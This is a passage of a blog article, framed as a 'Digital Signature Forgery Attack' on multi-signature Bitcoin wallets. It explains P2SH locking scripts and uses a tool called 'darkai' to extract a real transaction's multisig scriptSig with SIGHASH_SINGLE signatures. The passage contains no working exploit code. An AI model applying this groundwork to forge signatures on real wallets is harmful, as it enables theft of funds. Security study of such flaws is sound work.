<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-9.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-9.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2. Detailed explanation of elements:&nbsp;&nbsp;<em>Script field</em></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#2-detailed-explanation-of-elementsscript-field"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Content:</strong> <code>'a91406612b7cb2027e80ec340f9e02ffe4a9a59ba76287'</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This is the so-called <strong>locking script</strong> or, otherwise, <strong>scriptPubKey</strong> – a script that specifies the conditions under which this output can be spent.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Decoding the script</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#decoding-the-script-1"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The specified value corresponds to the standard script type in the Bitcoin network:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong><code>a9</code></strong>— operation code OP_HASH160 (produces RIPEMD-160 from SHA-256 from the next line).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong><code>14</code></strong>— length of the subsequent field: 20 bytes (40 hexadecimal characters).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong><code>06612b7cb2027e80ec340f9e02ffe4a9a59ba762</code></strong>— is a 20-byte hash that identifies either a Bitcoin wallet address or a script.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong><code>87</code></strong>— operation code OP_EQUAL.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Taken together, this entry means&nbsp;<strong>a P2SH address</strong>&nbsp;(Pay-to-Script-Hash). In this case, funds are assigned to a certain script combination, and to withdraw them, you will need to reveal the script whose hash is recorded here and present signatures (or other data) that satisfy the conditions of this script.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>The most common uses of this scheme are for multi-signatures, simple and complex smart contracts, bilateral multi-signatures, conditional security schemes, and other advanced scenarios.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3. The practical meaning of the result, the size and purpose of the funds.</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#3-the-practical-meaning-of-the-result-the-size-and-purpose-of-the-funds"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>The transaction in question (with hash <strong>bd992789fd8cff1a2e515ce2c3473f510df933e1f44b3da6a8737630b82d0786</strong> ) has an output in which <strong>0.05 BTC (5,000,000 satoshis)</strong> are “locked” in the P2SH address corresponding to the hash<code><strong>06612b7cb2027e80ec340f9e02ffe4a9a59ba762</strong></code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Conditions for spending:</strong><br>To spend these funds, when forming a spending transaction, it is necessary to present not only a standard signature, as with a direct transfer, but also the script itself, the hash of which is embedded in this output, plus data <em>(for example, a set of digital signatures)</em> that correspond to the conditions of the script.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Security and flexibility:</strong><br>This method allows for more complex logic to be implemented than sending directly to a regular Bitcoin address.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4. Registration of the exit to the level of compatibility with various services and wallets that support P2SH.</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#4-registration-of-the-exit-to-the-level-of-compatibility-with-various-services-and-wallets-that-support-p2sh"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Transaction ID<br><strong>bd992789fd8cff1a2e515ce2c3473f510df933e1f44b3da6a8737630b82d0786</strong><br>contains an output in which<br><strong>0.05 BTC</strong> (5,000,000 satoshi)<br>is secured to a P2SH script (Pay-to-Script-Hash) with a hash of<br><strong>06612b7cb2027e80ec340f9e02ffe4a9a59ba762</strong> .</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>To spend these funds, you must reveal the original script and fulfill its conditions (for example, present all signatures in a multi-signature).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Thus, the deserialization result reports the presence of a certain amount of bitcoins at a conditional (P2SH) address and defines strict rules for their spending, which plays a key role in the management and accounting of funds in the Bitcoin network.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-30-1024x37.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-30-1024x37.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">P2SH (Pay-to-Script-Hash) locking script in Bitcoin network. What does this script mean?</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#p2sh-pay-to-script-hash-locking-script-in-bitcoin-network-what-does-this-script-mean"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The script&nbsp;<code><strong>'a91406612b7cb2027e80ec340f9e02ffe4a9a59ba76287'</strong></code>is chosen and used in this transaction output because it represents a typical&nbsp;<strong>P2SH (Pay-to-Script-Hash)</strong>&nbsp;locking script in the Bitcoin network.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>Let’s look at it piece by piece:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong><code>a9</code></strong>— OP_HASH160: A hashing operation that first applies SHA-256 and then RIPEMD-160 to subsequent data.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong><code>14</code></strong>— hash length is 20 bytes (in hexadecimal format).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong><code>06612b7cb2027e80ec340f9e02ffe4a9a59ba762</code></strong>— a 20-byte hash of the script, known as <em>the script hash</em> .</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong><code>87</code></strong>— OP_EQUAL: An operator that checks the equality of two values on the stack.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Thus, this script requires that at the time of use (spending funds) a script whose hash matches is presented&nbsp;<code>06612b7cb2027e80ec340f9e02ffe4a9a59ba762</code>, and that the conditions of this script are met.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Why was this particular one chosen?</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#why-was-this-particular-one-chosen"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Convenience and security:</strong> P2SH allows complex funds management logic (such as multi-signatures or conditional payments) to be hidden in a hash, simplifying the interface for the sender and receiver.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Industry standard:</strong> P2SH has become a widely accepted standard because it simplifies the setup of complex security schemes and is compatible with most wallets and services.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Compactness:</strong> The block stores only the hash of a complex script, not the entire script – this saves space and increases efficiency.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Flexibility:</strong> The owner of the funds can create arbitrary conditions for spending – such as requiring multiple signatures, time delays, or other rules – and the hash of these conditions is stored here.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>The script&nbsp;<code><strong>'a91406612b7cb2027e80ec340f9e02ffe4a9a59ba76287'</strong></code>is a P2SH locking script, which says that in order to spend 0.05 BTC, you need to provide the original script with the hash&nbsp;<strong><code>06612b7cb2027e80ec340f9e02ffe4a9a59ba762</code>&nbsp;</strong>and fulfill the conditions specified in it. This provides a balance between convenience, security and functionality – the main reason for choosing this particular script in this transaction. The hash&nbsp;<strong><code>06612b7cb2027e80ec340f9e02ffe4a9a59ba762</code>&nbsp;</strong>in the P2SH script is&nbsp;<strong>the result of a specific hashing of the original script (redeem script)</strong>&nbsp;, which determines the conditions for spending funds from this output.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Why this hash and not another?</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#why-this-hash-and-not-another"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>A hash is a digital fingerprint of a script that specifies the rules for spending.</strong><br>When creating a P2SH address or output, the script (the conditions for spending Bitcoin) is first written explicitly, then two hashing algorithms are applied:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>SHA-256 from the script,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Then RIPEMD-160 the SHA-256 result.<br>The resulting 20-byte hash is <code>06612b7cb2027e80ec340f9e02ffe4a9a59ba762</code>. This hash uniquely identifies the exact scenario for which it was generated.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Uniqueness and Immutability</strong><br>Cryptographic hash functions have an “avalanche effect” property, whereby even a minimal change to the original script will produce a completely different hash. Therefore, this hash is unique and unforgeable in the context of the original script.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>The purpose of using a hash is to ensure compactness and security.</strong><br>Instead of storing the full script in each output, which can be complex and take up a lot of space, only its hash is stored in the block. This saves space and increases privacy – the script itself is revealed only when funds are spent and only to those who fulfill the conditions.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>The hash selection is the result of a specific script defined by the creator of the address or wallet.</strong><br>The developer or owner of the funds creates a script with the desired conditions (e.g. multi-signature, time delay, other logical conditions). The assigned script is hashed and this hash is tied to the transaction output. Thus, there is no arbitrary hash selection – it is determined by the content of the original script and the cryptographic algorithm.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>This hash is strictly linked to a specific script that the address owner has installed to protect their funds.</strong></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>It was generated using cryptographic hash functions ( <code><strong>SHA-256 + RIPEMD-160)</strong></code>from the original redeem script, so it is not possible to randomly or arbitrarily select a different hash.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This hash is a reflection of the unique combination of spending conditions, and that is why it ended up in the transaction output script.<code><strong>a91406612b7cb2027e80ec340f9e02ffe4a9a59ba76287</strong></code></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Thus, the choice of this particular hash is dictated by the need for an accurate and secure linking of the output with specific spending conditions that control access to funds in the blockchain. All this is ensured by the properties of cryptographic hash functions, their uniqueness, and the impossibility of reverse recovery of the original data.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading" id="user-content-p2sh--------bitcoin">P2SH Mechanism: Meaning, Working Principle and Security in Bitcoin Network</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#p2sh-mechanism-meaning-working-principle-and-security-in-bitcoin-network"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Bitcoin developers have written the&nbsp;<strong>P2SH (Pay-to-Script-Hash)</strong>&nbsp;mechanism into the code as a key innovation that ensures security and expands the capabilities of the blockchain network. Let’s consider the structure and operating principle of this script, its difference from classic transactions, as well as the reasons for choosing this approach to storing and protecting digital assets.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Traditionally, Bitcoin transactions have worked using the&nbsp;<strong>Pay-to-Pubkey-Hash (P2PKH)</strong>&nbsp;scheme – where funds are “locked” using the recipient’s public key hash. To spend these funds, the user must provide their digital signature and public key, which are verified by the network.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>However, beyond P2PKH, the interface was limited, as Bitcoin Script allows for much more complex spending conditions, from multi-signatures to time locks and other smart contract agreements. The problem was that long and complex scripts inevitably increased the size of transactions and reduced their usability.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em><strong>It was to simplify interaction with such complex scenarios that the P2SH</strong>&nbsp;concept was introduced in 2012&nbsp;, standardized in BIP 16 by Gavin Andresen. The essence of P2SH comes down to replacing the full script of spending conditions in scriptPubKey with its&nbsp;<strong>cryptographic hash</strong>&nbsp;– the so-called script hash.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallet Operational Methods with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading" id="user-content-p2sh">How does the P2SH output script structure work?</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#how-does-the-p2sh-output-script-structure-work"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Let’s look at the script specified as a result of deserialization:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>OP_HASH160 06612b7cb2027e80ec340f9e02ffe4a9a59ba762 OP_EQUAL</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>This script differs from the standard P2PKH in that instead of a public key hash, it stores a hash&nbsp;<strong>of a redeemScript</strong>&nbsp;– a set of conditions under which funds can be spent.</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>OP_HASH160</strong> – hashes the data (in this case redeemScript) first with the SHA-256 algorithm, and then with RIPEMD-160.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>06612b7cb2027e80ec340f9e02ffe4a9a59ba762</strong> — 20-byte hash redeemScript.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>OP_EQUAL</strong> – checks if the provided redeemScript is equal to this hash.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">The process of spending funds via a P2SH output</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#the-process-of-spending-funds-via-a-p2sh-output"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>To spend such funds, it is necessary to transmit in the inputs (scriptSig) of the transaction referring to this output:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Serialized redeemScript</strong> – the original script whose conditions are encoded in a hash.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Unlock data</strong> – signatures or other evidence that meet the conditions of the redeemScript.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>When processing a transaction, network nodes:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Hash the redeemScript and compare it with the hash specified in output.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If the hashes match (i.e. OP_EQUAL returns true), then redeemScript is deserialized and executed.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>A transaction is considered valid if the redeemScript is executed correctly, i.e. all spending conditions are met.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>P2SH thus shifts the responsibility for presenting and verifying the terms of the spend from the sender (who creates the required script) to the spender.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">The advantages and importance of choosing such a mechanism</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#the-advantages-and-importance-of-choosing-such-a-mechanism"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1. Flexibility and complex scenarios</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#1-flexibility-and-complex-scenarios"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>P2SH allows you to create addresses with arbitrary, often multi-level conditions – for example, a multi-signature requirement (2 out of 3, 3 out of 5, etc.), time limits, distribution logic, and much more. In this case, the sender simply sends funds to a compact hash address, without going into technical details.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2. Saving space</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#2-saving-space"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Instead of storing the full script in the blockchain, only its hash is stored in the transaction. This reduces the load on the network, reduces the size of blocks and speeds up the verification of transactions.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3. Increased security</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#3-increased-security"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Since&nbsp;<strong><a href="https://keyhunters.ru/script-is-stack-based-bitcoin-uses-a-scripting-system-for-transactions/">the redeemScript</a></strong>&nbsp;is only revealed and verified at the time of spending, it increases the confidentiality of the terms and makes unauthorized access attempts more difficult. The use of cryptographic hash functions guarantees protection against forgery and modification – any slight deviation in the script will result in a different hash and the network will refuse to accept the transaction.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4. Convenience for users and programmers</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#4-convenience-for-users-and-programmers"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>P2SH standardizes and simplifies the use of complex smart contracts in Bitcoin, simplifying integration and increasing compatibility with a variety of wallets and services.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Example of use: multi-signature wallets</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#example-of-use-multi-signature-wallets"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>A classic example is a wallet that requires signatures from two of five participants to complete a transaction. With P2SH:</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The output contains the hash of the corresponding script.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>To spend funds, you need to pass the full multi-signature enable script in scriptSig with signatures.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The network checks the consistency of hashes and the validity of signatures.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>This makes P2SH ideal for corporate accounts, joint ventures, and other situations where access control is required. The&nbsp;<strong>Pay-to-Script-Hash (P2SH)</strong>&nbsp;mechanism is a fundamental part of the Bitcoin architecture, providing a balance between:</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Security</strong> (protecting funds through strict conditions and cryptography),</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Efficiency</strong> (storing only the hash, not all the details),</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Flexibility</strong> (support for any, even complex, spending conditions),</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Convenience</strong> (simple address format and access standard).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/How-does-the-P2S.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/How-does-the-P2S.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallet Operational Methods with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Cryptanalysis of the extraction of the first transaction input (&nbsp;<code>ins</code>)</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#cryptanalysis-of-the-extraction-of-the-first-transaction-input-ins"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Let’s run a command to obtain information about one of the inputs of a transaction with a hash&nbsp;<code>6102bfd4bad33443bcb99765c0751b6b8e4e65f4db4e3b65324c5e9e3dac8132</code>. Analysis of such an input is important for understanding the mechanism of authorization of spending funds at the script level.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./darkai -scriptsig 6102bfd4bad33443bcb99765c0751b6b8e4e65f4db4e3b65324c5e9e3dac8132</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>The result of extracting the first input of the transaction (&nbsp;<code>ins</code>) is presented as follows:</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>{  'script': '00483045022100e5d7c59ea1fb5d0285e755dfc09634e1e3af36d12950b9b5d5f92b136021b3d202202c181129443b08dcfb8d9ced30187186c57c96f9cdb3f3914e0798682ea35d2b03493046022100e1f8dbad16926cfa3bf61b66e23b3846323dcabf6c75748bcfad762fc50bfaf402210081d955160b5f8d2b9d09d8838a2cf61f5055009d9031e0e106e19ebab234d949034c695221023927b5cd7facefa7b85d02f73d1e1632b3aaf8dd15d4f9f359e37e39f05611962103d2c0e82979b8aba4591fe39cffbf255b3b9c67b3d24f94de79c5013420c67b802103ec010970aae2e3d75eef0b44eaa31d7a0d13392513cd0614ff1c136b3b1020df53ae',  'outpoint': {    'index': 1,    'hash': 'ec2a40cac3ac5dadf1d31f3cad03bdc8465caab5acbc5407ee7f4a7400aab577'  },  'sequence': 4294967295}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1. Detailed analysis of ScriptSig components (&nbsp;<code>script</code>)</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#1-detailed-analysis-of-scriptsig-components-script"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The value of the field <code>script</code>is <strong>the scriptSig</strong> , which is used to unlock the corresponding previous transaction output.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The content is a long sequence of bytes in hexadecimal format.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>In this case, it is a five-component script, which includes:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Standard digital signatures according to the ECDSA protocol, typically to confirm ownership of a private key.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Public keys required to verify the signature.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>There may be a structure indicating multi-signature operations (multiple public keys and signatures).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Analysis of the script structure:</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#analysis-of-the-script-structure"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Starts with <code>00</code>, which in the context of scriptSig can mean <strong>OP_0</strong> , traditionally used in multi-signature scenarios (e.g. in the case of the Pay-to-Script-Hash multi-signature standard, where a stub is needed).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Next come the signatures in DER format (e.g. <code>3045...</code>), which typically consist of a series of bytes containing the signature details.</li>
<!-- /wp:list-item -->

